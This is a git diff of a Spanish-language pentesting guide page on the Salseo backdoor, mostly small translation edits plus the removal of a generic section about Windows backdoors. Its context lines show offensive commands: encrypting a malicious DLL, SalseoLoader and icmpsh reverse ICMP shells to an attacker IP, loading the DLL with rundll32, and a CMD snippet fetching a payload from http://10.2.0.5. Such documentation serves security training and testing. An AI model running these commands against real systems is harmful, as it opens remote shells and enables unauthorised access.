@@ -39,41 +39,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-### Introducción
-
-En este capítulo, discutiremos los backdoors en sistemas operativos Windows. Un backdoor es una puerta trasera que permite a un atacante acceder a un sistema sin ser detectado. Los backdoors pueden ser instalados en un sistema de varias maneras, incluyendo la explotación de vulnerabilidades en el sistema operativo o en una aplicación instalada en el sistema.
-
-### Tipos de backdoors
-
-Hay varios tipos de backdoors que se pueden instalar en un sistema Windows. Algunos de los más comunes incluyen:
-
-- Backdoors de puerta trasera: Estos backdoors se instalan en el sistema y permiten al atacante acceder al sistema sin ser detectado. Estos backdoors pueden ser instalados por un atacante que tenga acceso físico al sistema o por un atacante que haya explotado una vulnerabilidad en el sistema.
-
-- Backdoors de shell inverso: Estos backdoors permiten al atacante conectarse al sistema y ejecutar comandos en el sistema. Estos backdoors son especialmente útiles para los atacantes que quieren mantener el acceso al sistema después de que se haya cerrado la sesión.
-
-- Backdoors de servidor web: Estos backdoors se instalan en un servidor web y permiten al atacante acceder al sistema a través del servidor web. Estos backdoors son especialmente útiles para los atacantes que quieren acceder a sistemas que están detrás de un firewall.
-
-### Instalación de backdoors
-
-La instalación de backdoors en un sistema Windows puede ser un proceso complicado. Los atacantes pueden utilizar varias técnicas para instalar backdoors en un sistema, incluyendo la explotación de vulnerabilidades en el sistema operativo o en una aplicación instalada en el sistema.
-
-Una vez que se ha instalado un backdoor en un sistema, el atacante puede utilizar el backdoor para acceder al sistema y ejecutar comandos en el sistema. Los atacantes pueden utilizar los backdoors para robar información del sistema, instalar malware en el sistema o para mantener el acceso al sistema después de que se haya cerrado la sesión.
-
-### Detección de backdoors
-
-La detección de backdoors en un sistema Windows puede ser un proceso complicado. Los atacantes pueden utilizar varias técnicas para ocultar los backdoors en un sistema, incluyendo la encriptación de los backdoors y la utilización de técnicas de ofuscación.
-
-Sin embargo, hay varias herramientas que se pueden utilizar para detectar backdoors en un sistema Windows. Algunas de estas herramientas incluyen:
-
-- Herramientas de análisis de tráfico de red: Estas herramientas pueden utilizarse para detectar tráfico de red sospechoso que pueda estar relacionado con un backdoor.
-
-- Herramientas de análisis de archivos: Estas herramientas pueden utilizarse para detectar archivos sospechosos que puedan estar relacionados con un backdoor.
-
-- Herramientas de análisis de registro: Estas herramientas pueden utilizarse para detectar entradas de registro sospechosas que puedan estar relacionadas con un backdoor.
-
-### Conclusiones
-
-Los backdoors son una amenaza seria para los sistemas operativos Windows. Los atacantes pueden utilizar varios tipos de backdoors para acceder a un sistema y ejecutar comandos en el sistema. La detección de backdoors puede ser un proceso complicado, pero hay varias herramientas que se pueden utilizar para detectar backdoors en un sistema Windows.
+Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -115,7 +81,7 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Compilando SalseoLoader como DLL exportando la función principal
+## Compilando SalseoLoader como DLL exportando función principal
 
 Abre el proyecto SalseoLoader usando Visual Studio.
 
@@ -125,7 +91,7 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Instala DllExport para este proyecto
 
-#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
+#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
@@ -151,11 +117,11 @@ Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), s
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### **Abre el proyecto nuevamente con Visual Studio**
+### **Abre el proyecto de nuevo con Visual Studio**
 
 **\[DllExport]** ya no debería estar marcado como error
 
-![](<../.gitbook/assets/image (8) (1) (1).png>)
+![](<../.gitbook/assets/image (8) (1).png>)
 
 ### Compila la solución
 
@@ -194,7 +160,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes y la ejecución de programas. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas Windows comprometidos.
+CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes, la ejecución de programas y la solución de problemas de sistema. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas comprometidos.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
